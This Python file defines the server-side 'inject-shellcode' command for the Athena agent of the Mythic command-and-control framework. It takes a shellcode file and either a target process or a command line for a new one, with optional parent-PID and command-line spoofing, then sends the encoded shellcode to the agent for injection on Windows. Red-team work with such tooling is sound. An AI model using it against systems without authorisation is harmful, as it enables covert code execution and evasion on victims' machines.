from mythic_container.MythicCommandBase import *  # import the basics
import json  # import any other code you might need
# import the code for interacting with Files on the Mythic server
from mythic_container.MythicRPC import *

from .athena_utils import message_converter

# create a class that extends TaskArguments class that will supply all the arguments needed for this command
class InjectShellcodeArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        # this is the part where you'd add in your additional tasking parameters
        self.args = [
            CommandParameter(
                name="file",
                type=ParameterType.File,
                description="",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=True,
                        group_name="Default",
                        ui_position=0,
                    ),
                    ParameterGroupInfo(
                        required=False,
                        group_name="Existing Process",
                        ui_position=0,
                    )
                ],
            ),
            CommandParameter(
                name="parent",
                type=ParameterType.Number,
                description="If set, will spoof the parent process ID",
                default_value=0,
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False,
                        group_name="Default",
                        ui_position=1,
                    )
                ],
            ),
            CommandParameter(
                name="pid",
                type=ParameterType.Number,
                description="Inject into a specific existing process",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False,
                        group_name="Existing Process",
                        ui_position=1,
                    )
                ],
            ),
            CommandParameter(
                name="commandline",
                type=ParameterType.String,
                description="The name of the process to inject into",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=True,
                        group_name="Default",
                        ui_position=2,
                    )
                ],
            ),
            CommandParameter(
                name="output",
                type=ParameterType.Boolean,
                description="Display assembly output. Default: True",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=True,
                        group_name="Default",
                        ui_position=3,
                    ),
                    ParameterGroupInfo(
                        required=False,
                        group_name="Existing Process",
                        ui_position=2,
                    )
                ],
            ),
            CommandParameter(
                name="spoofedcommandline",
                type=ParameterType.String,
                description="Display assembly output. Default: True",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False,
                        group_name="Default",
                        ui_position=4,
                    )
                ],
            ),
        ]

    # you must implement this function so that you can parse out user typed input into your paramters or load your parameters based on some JSON input
    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == "{":
                self.load_args_from_json_string(self.command_line)


# this is information about the command itself
class InjectShellcodeCommand(CommandBase):
    cmd = "inject-shellcode"
    needs_admin = False
    help_cmd = "inject-shellcode"
    description = "Execute a shellcode buffer in a remote process and (optionally) return the output"
    version = 1
    author = ""
    argument_class = InjectShellcodeArguments
    attackmapping = ["T1055", "T1564.010", "T1134.004"]
    browser_script = None
    attributes = CommandAttributes(
        supported_os=[
            SupportedOS.Windows,
        ],
    )

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        fData = FileData()
        fData.AgentFileId = taskData.args.get_arg("file")
        file = await SendMythicRPCFileGetContent(fData)
        groupName = taskData.args.get_parameter_group_name()
        if file.Success:
            file_contents = base64.b64encode(file.Content)
            taskData.args.add_arg("asm", file_contents.decode("utf-8"), parameter_group_info=[ParameterGroupInfo(group_name=groupName, required=True)]
                                  )
        else:
            raise Exception("Failed to get file contents: " + file.Error)
        
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        if "message" in response:
            user_output = response["message"]
            await MythicRPC().execute("create_output", task_id=task.Task.ID, output=message_converter.translateAthenaMessage(user_output))

        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp

